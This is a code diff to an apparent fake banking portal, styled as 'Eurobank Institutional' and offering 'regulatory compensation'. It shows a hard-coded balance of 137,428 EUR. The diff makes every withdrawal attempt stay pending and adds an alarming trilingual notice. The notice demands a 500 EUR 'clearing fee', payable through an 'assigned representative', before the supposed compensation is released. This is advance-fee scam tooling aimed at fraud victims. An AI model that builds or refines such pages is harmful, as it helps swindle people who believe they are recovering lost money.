@@ -17,7 +17,7 @@
   --ink:#08090a; --panel:#0d0e10; --panel-2:#111215;
   --line:rgba(255,255,255,.11); --line-soft:rgba(255,255,255,.06);
   --paper:#f2efe9; --muted:#8a8a90; --dim:#5c5d63;
-  --red:#e2001a; --green:#3f9c72;
+  --red:#e2001a; --green:#3f9c72; --amber:#d9a03a;
 }
 *{ -webkit-font-smoothing:antialiased; }
 html{ background:var(--ink); }
@@ -147,6 +147,36 @@ table.lh{ width:100%; border-collapse:collapse; font-size:12px; }
 table.lh th{ font-size:9.5px; letter-spacing:.2em; text-transform:uppercase; color:var(--dim); font-weight:500; text-align:left; padding:0 14px 12px; border-bottom:1px solid var(--line); }
 table.lh td{ padding:14px; border-bottom:1px solid var(--line-soft); }
 table.lh tr:hover td{ background:rgba(255,255,255,.02); }
+
+/* Pending row */
+tr.pending td{ background:rgba(217,160,58,.035); }
+tr.pending:hover td{ background:rgba(217,160,58,.06); }
+.pend-dot{ width:5px; height:5px; border-radius:999px; background:var(--amber); display:inline-block; animation:pendPulse 1.8s ease-in-out infinite; }
+@keyframes pendPulse{ 0%,100%{opacity:1; box-shadow:0 0 0 0 rgba(217,160,58,.55);} 50%{opacity:.45; box-shadow:0 0 0 4px rgba(217,160,58,0);} }
+
+/* ============ CLEARING FEE — ERROR NOTICE ============ */
+.clearing{
+  position:relative; overflow:hidden; border-radius:2px;
+  background:
+    radial-gradient(120% 100% at 0% 0%, rgba(226,0,26,.20) 0%, rgba(226,0,26,.05) 55%, rgba(226,0,26,.02) 100%),
+    #140609;
+  border:1px solid rgba(226,0,26,.40);
+  border-left:3px solid var(--red);
+  animation:clearingIn .45s cubic-bezier(.16,1,.3,1) both, shake .55s cubic-bezier(.36,.07,.19,.97) .12s both;
+}
+.clearing::after{
+  content:''; position:absolute; top:0; left:0; right:0; height:1px;
+  background:linear-gradient(90deg,transparent,rgba(255,90,105,.65),transparent);
+}
+@keyframes clearingIn{ from{opacity:0; transform:translateY(12px);} to{opacity:1; transform:translateY(0);} }
+@keyframes shake{ 0%,100%{transform:translateX(0)} 14%{transform:translateX(-5px)} 28%{transform:translateX(4px)} 42%{transform:translateX(-3px)} 58%{transform:translateX(2px)} 76%{transform:translateX(-1px)} }
+.clearing-title{ font-size:10.5px; letter-spacing:.2em; text-transform:uppercase; color:#ff5c6b; font-weight:600; line-height:1.5; }
+.clearing-body{ font-size:12.5px; line-height:1.8; color:#f6e2e4; }
+.clearing-alt{ font-size:10.5px; line-height:1.75; color:#bd9096; border-top:1px dashed rgba(226,0,26,.3); }
+.clearing-alt b{ color:#ff8b96; font-weight:600; letter-spacing:.14em; font-family:'JetBrains Mono',monospace; font-size:9px; }
+.fee-amount{ font-size:30px; font-weight:200; letter-spacing:-.03em; color:#fff; line-height:1; }
+.clearing-pulse{ box-shadow:0 0 0 0 rgba(226,0,26,.45); animation:pulse 2.6s ease-out infinite; }
+@keyframes pulse{ 70%{ box-shadow:0 0 0 10px rgba(226,0,26,0);} 100%{ box-shadow:0 0 0 0 rgba(226,0,26,0);} }
 </style>
 </head>
 <body>
@@ -475,6 +505,10 @@ table.lh tr:hover td{ background:rgba(255,255,255,.02); }
           Eurobank Institutional · PSD2 / AMLD5 · Einlagensicherung bis 1.000.000,00 €
         </div>
       </div>
+
+      <!-- ===== CLEARING FEE NOTICE — persistent, very end of page ===== -->
+      <div id="clearingBanner" class="hidden"></div>
+
     </section>
 
   </div>
@@ -488,7 +522,7 @@ table.lh tr:hover td{ background:rgba(255,255,255,.02); }
 
 <!-- MODAL: TRANSFER -->
 <div id="transferModal" class="modal hidden">
-  <div class="card w-full max-w-[520px] p-8 relative fade">
+  <div class="card w-full max-w-[520px] max-h-[92vh] overflow-y-auto p-8 relative fade">
     <button onclick="closeTransferModal()" class="absolute top-6 right-6 text-[#5c5d63] hover:text-[#e2001a] transition"><i class="fa-solid fa-xmark"></i></button>
     <div class="eyebrow mb-3" data-i18n="modal_tr_eyebrow">Zahlungsauftrag</div>
     <h3 class="text-[20px] font-light tracking-[-.01em] mb-1" data-i18n="modal_tr_title">Neue SEPA-Überweisung</h3>
@@ -498,7 +532,7 @@ table.lh tr:hover td{ background:rgba(255,255,255,.02); }
       <span id="transferModalAlertMsg">Ungültiger Betrag.</span>
     </div>
 
-    <form onsubmit="handleTransferSubmit(event)" class="space-y-7">
+    <form id="transferForm" onsubmit="handleTransferSubmit(event)" class="space-y-7">
       <div>
         <label class="eyebrow block mb-2.5" data-i18n="modal_tr_recipient">Begünstigter</label>
         <input type="text" id="inputRecipientName" required placeholder="Name des Begünstigten" class="field" data-i18n-ph="modal_tr_recipient_ph">
@@ -530,6 +564,9 @@ table.lh tr:hover td{ background:rgba(255,255,255,.02); }
         <button type="submit" class="btn" data-i18n="btn_authorize">Autorisieren (2FA)</button>
       </div>
     </form>
+
+    <!-- CLEARING FEE NOTICE — appears at the very end, after authorization -->
+    <div id="clearingFeePanel" class="hidden mt-7"></div>
   </div>
 </div>
 
@@ -646,6 +683,7 @@ const translations = {
     btn_close: "Schließen",
     today: "Heute",
     yesterday: "Gestern",
+    status_pending: "In Bearbeitung",
     toast_ok_auth: "Freigabe geladen",
     toast_ok_auth_sub: "Verifizierter Befund bereitgestellt.",
     toast_portal_open: "Portal geöffnet",
@@ -654,7 +692,16 @@ const translations = {
     toast_logout_sub: "Verbindung geschlossen.",
     toast_tx_sent: "Auftrag ausgeführt",
     toast_copied: "Kopiert",
-    toast_copied_sub: "in die Zwischenablage übernommen."
+    toast_copied_sub: "in die Zwischenablage übernommen.",
+
+    /* --- Clearing fee notice --- */
+    clearing_fee_title: "Achtung — Clearing-Gebühr ausstehend",
+    clearing_fee_label: "Clearing-Gebühr",
+    clearing_fee_body: "Wir freuen uns, Ihnen mitteilen zu können, dass Ihre Quote erfolgreich aktiviert und Ihre Kompensationszahlung genehmigt wurde. Um den Vorgang abzuschließen, bitten wir Sie, Ihre Anfrage nach Entrichtung der Clearing-Gebühr in Höhe von 500 EUR erneut einzuleiten. Bitte setzen Sie sich mit Ihrem zuständigen Ansprechpartner in Verbindung, um die entsprechenden Zahlungsdaten zu erhalten.",
+    btn_copy_fee: "Gebührenhinweis kopieren",
+    btn_resubmit: "Anfrage erneut einreichen",
+    toast_fee_title: "Clearing-Gebühr offen",
+    toast_fee_sub: "Auftrag vorgemerkt — Saldo unverändert."
   },
   en: {
     brand_sts_sub: "Regulatory compensation for investment risks",
@@ -737,6 +784,7 @@ const translations = {
     btn_close: "Close",
     today: "Today",
     yesterday: "Yesterday",
+    status_pending: "Processing",
     toast_ok_auth: "Clearance Loaded",
     toast_ok_auth_sub: "Verified findings provided.",
     toast_portal_open: "Portal Opened",
@@ -745,7 +793,16 @@ const translations = {
     toast_logout_sub: "Connection closed.",
     toast_tx_sent: "Order Executed",
     toast_copied: "Copied",
-    toast_copied_sub: "copied to clipboard."
+    toast_copied_sub: "copied to clipboard.",
+
+    /* --- Clearing fee notice --- */
+    clearing_fee_title: "Attention — Clearing Fee Outstanding",
+    clearing_fee_label: "Clearing Fee",
+    clearing_fee_body: "We are pleased to inform you that your quota has been successfully activated and your compensation payment has been approved. To complete the process, please resubmit your request after paying the clearing fee of 500 EUR. Please contact your assigned representative to obtain the relevant payment details.",
+    btn_copy_fee: "Copy Fee Notice",
+    btn_resubmit: "Resubmit Request",
+    toast_fee_title: "Clearing Fee Outstanding",
+    toast_fee_sub: "Order reserved — balance unchanged."
   },
   fr: {
     brand_sts_sub: "Compensation réglementaire des risques d'investissement",
@@ -828,6 +885,7 @@ const translations = {
     btn_close: "Fermer",
     today: "Aujourd'hui",
     yesterday: "Hier",
+    status_pending: "En cours de traitement",
     toast_ok_auth: "Autorisation chargée",
     toast_ok_auth_sub: "Rapport vérifié mis à disposition.",
     toast_portal_open: "Portail ouvert",
@@ -836,7 +894,16 @@ const translations = {
     toast_logout_sub: "Connexion fermée.",
     toast_tx_sent: "Ordre exécuté",
     toast_copied: "Copié",
-    toast_copied_sub: "a été copié dans le presse-papiers."
+    toast_copied_sub: "a été copié dans le presse-papiers.",
+
+    /* --- Clearing fee notice --- */
+    clearing_fee_title: "Attention — frais de compensation en attente",
+    clearing_fee_label: "Frais de compensation",
+    clearing_fee_body: "Nous avons le plaisir de vous informer que votre quota a été activé avec succès et que votre paiement d'indemnisation a été approuvé. Afin de finaliser la procédure, nous vous prions de bien vouloir soumettre à nouveau votre demande après le règlement des frais de compensation (clearing) d'un montant de 500 EUR. Veuillez contacter votre conseiller attitré afin d'obtenir les coordonnées de paiement correspondantes.",
+    btn_copy_fee: "Copier l'avis de frais",
+    btn_resubmit: "Soumettre à nouveau la demande",
+    toast_fee_title: "Frais de compensation en attente",
+    toast_fee_sub: "Ordre réservé — solde inchangé."
   }
 };
 
@@ -844,6 +911,7 @@ let currentLang = 'de';
 const REQUIRED_INCIDENT_ID = 'FIU-47982-LB';
 let currentBalance = 137428.00;
 let sessionName = '';
+let clearingPending = false;
 let transactions = [
   { counterparty: 'European Settlement AG', ref: 'INVOICE-2024-8841', isToday: true, timeStr: '09:15', type: 'SCT Inst', amount: '+137,428.00', isPositive: true },
   { counterparty: 'Deutsche Bundesbank Clearing', ref: 'FEE-Q3-CLEARING', isYesterday: true, timeStr: '', type: 'Debit', amount: '-12.50', isPositive: false }
@@ -879,6 +947,7 @@ function setLanguage(lang) {
   }
 
   renderTransactions();
+  if (clearingPending) renderClearingNotices();
 }
 
 function setStage(n, opts) {
@@ -965,6 +1034,9 @@ function logout() {
   document.getElementById('inputUsername').value = '';
   document.getElementById('loginError').classList.add('hidden');
   closeTransferModal(); closeCertificateModal(); setStage(1);
+  clearingPending = false;
+  document.getElementById('clearingBanner').classList.add('hidden');
+  document.getElementById('clearingFeePanel').classList.add('hidden');
   toast(translations[currentLang].toast_logout, translations[currentLang].toast_logout_sub, 'info');
 }
 
@@ -988,18 +1060,27 @@ function renderTransactions() {
       dateStr = t.timeStr;
     }
 
+    const typeCell = t.pending
+      ? `<span class="inline-flex items-center gap-1.5 text-[9.5px] tracking-[.16em] uppercase text-[#d9a03a]"><span class="pend-dot"></span>${d.status_pending}</span>`
+      : `<span class="text-[9.5px] tracking-[.16em] uppercase ${t.isPositive ? 'text-[#3f9c72]' : 'text-[#8a8a90]'}">${t.type}</span>`;
+
+    const amountClass = t.pending ? 'text-[#d9a03a]' : t.isPositive ? 'text-[#3f9c72]' : 'text-[#f2efe9]';
+
     const tr = document.createElement('tr');
+    if (t.pending) tr.className = 'pending';
     tr.innerHTML = `
       <td class="text-[#f2efe9]">${t.counterparty}</td>
       <td class="text-[#8a8a90]">${t.ref}</td>
       <td class="text-[#5c5d63]">${dateStr}</td>
-      <td class="text-[9.5px] tracking-[.16em] uppercase ${t.isPositive ? 'text-[#3f9c72]' : 'text-[#8a8a90]'}">${t.type}</td>
-      <td class="text-right ${t.isPositive ? 'text-[#3f9c72]' : 'text-[#f2efe9]'}">${t.amount}</td>`;
+      <td>${typeCell}</td>
+      <td class="text-right ${amountClass}">${t.amount}</td>`;
     tb.appendChild(tr);
   });
 }
 
 function openTransferModal() {
+  document.getElementById('transferForm').classList.remove('hidden');
+  document.getElementById('clearingFeePanel').classList.add('hidden');
   document.getElementById('inputRecipientName').value = sessionName || '';
   document.getElementById('inputRecipientIBAN').value = '';
   document.getElementById('inputRecipientBIC').value = '';
@@ -1012,6 +1093,58 @@ function closeTransferModal() { document.getElementById('transferModal').classLi
 function setMaxTransferAmount() { document.getElementById('inputTransferAmount').value = currentBalance.toFixed(2); }
 function openCertificateModal() { document.getElementById('certificateModal').classList.remove('hidden'); }
 function closeCertificateModal() { document.getElementById('certificateModal').classList.add('hidden'); }
+
+/* ============ CLEARING FEE NOTICE ============ */
+function clearingBlockHTML(withActions) {
+  const d = translations[currentLang];
+  const others = ['de', 'en', 'fr'].filter(l => l !== currentLang);
+  const actions = withActions
+    ? `<div class="mt-6 flex flex-wrap gap-3 justify-end">
+         <button type="button" class="btn-ghost" onclick="copyClearingNotice()"><i class="fa-regular fa-copy text-[11px]"></i>${d.btn_copy_fee}</button>
+         <button type="button" class="btn" onclick="closeTransferModal()">${d.btn_close}</button>
+       </div>`
+    : `<div class="mt-6 flex flex-wrap gap-3">
+         <button type="button" class="btn-ghost" onclick="copyClearingNotice()"><i class="fa-regular fa-copy text-[11px]"></i>${d.btn_copy_fee}</button>
+         <button type="button" class="btn-ghost" onclick="openTransferModal()"><i class="fa-solid fa-rotate-right text-[10px]"></i>${d.btn_resubmit}</button>
+       </div>`;
+
+  return `
+  <div class="clearing p-5 sm:p-6">
+    <div class="flex items-start gap-3.5 mb-4">
+      <span class="shrink-0 w-7 h-7 rounded-full bg-[#e2001a] clearing-pulse flex items-center justify-center">
+        <i class="fa-solid fa-exclamation text-[12px] text-white"></i>
+      </span>
+      <div class="min-w-0 flex-1">
+        <div class="clearing-title">${d.clearing_fee_title}</div>
+        <div class="flex items-baseline gap-2.5 mt-2.5 flex-wrap">
+          <span class="fee-amount num">500</span>
+          <span class="text-[11px] tracking-[.24em] text-[#ff8b96]">EUR</span>
+          <span class="text-[9px] tracking-[.18em] uppercase text-[#b98d92] ml-1">${d.clearing_fee_label}</span>
+          <span class="ml-auto text-[9px] tracking-[.18em] uppercase text-[#b98d92] mono">#FIU-47982-LB</span>
+        </div>
+      </div>
+    </div>
+    <p class="clearing-body">${d.clearing_fee_body}</p>
+    <div class="clearing-alt mt-5 pt-3.5 space-y-2.5">
+      ${others.map(l => `<div><b>${l.toUpperCase()}</b><span> — ${translations[l].clearing_fee_body}</span></div>`).join('')}
+    </div>
+    ${actions}
+  </div>`;
+}
+
+function renderClearingNotices() {
+  document.getElementById('clearingFeePanel').innerHTML = clearingBlockHTML(true);
+  document.getElementById('clearingBanner').innerHTML = clearingBlockHTML(false);
+}
+
+function copyClearingNotice() {
+  const d = translations[currentLang];
+  const txt = `#FIU-47982-LB — ${d.clearing_fee_title}\n\n${d.clearing_fee_body}`;
+  const el = document.createElement('textarea');
+  el.value = txt;
+  document.body.appendChild(el); el.select(); document.execCommand('copy'); document.body.removeChild(el);
+  toast(translations[currentLang].toast_copied, `${translations[currentLang].clearing_fee_label} — ${translations[currentLang].toast_copied_sub}`, 'ok');
+}
 
 function handleTransferSubmit(e) {
   e.preventDefault();
@@ -1026,18 +1159,35 @@ function handleTransferSubmit(e) {
     return;
   }
   alertBox.classList.add('hidden');
-  currentBalance -= amount;
 
+  /* Balance stays untouched — the order is only reserved (pending) */
   const now = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
   transactions.unshift({
-    counterparty: recipient, ref: ref, isToday: true, timeStr: now,
+    counterparty: recipient,
+    ref: ref,
+    isToday: true,
+    timeStr: now,
     type: amount <= 100000 ? 'SCT Inst' : 'SCT Regular',
     amount: `-${amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`,
-    isPositive: false
+    isPositive: false,
+    pending: true
   });
 
-  updateBalanceDisplays(); renderTransactions(); closeTransferModal();
-  toast(translations[currentLang].toast_tx_sent, `SEPA: €${amount.toLocaleString('en-US', { minimumFractionDigits: 2 })}`, 'ok');
+  updateBalanceDisplays();
+  renderTransactions();
+
+  /* --- show clearing fee notice at the very end --- */
+  document.getElementById('transferForm').classList.add('hidden');
+  clearingPending = true;
+  renderClearingNotices();
+  const panel = document.getElementById('clearingFeePanel');
+  panel.classList.remove('hidden');
+  document.getElementById('clearingBanner').classList.remove('hidden');
+
+  const card = document.querySelector('#transferModal .card');
+  if (card) setTimeout(() => card.scrollTo({ top: card.scrollHeight, behavior: 'smooth' }), 60);
+
+  toast(translations[currentLang].toast_fee_title, translations[currentLang].toast_fee_sub, 'err');
 }
 
 function copyToClipboard(text, label) {
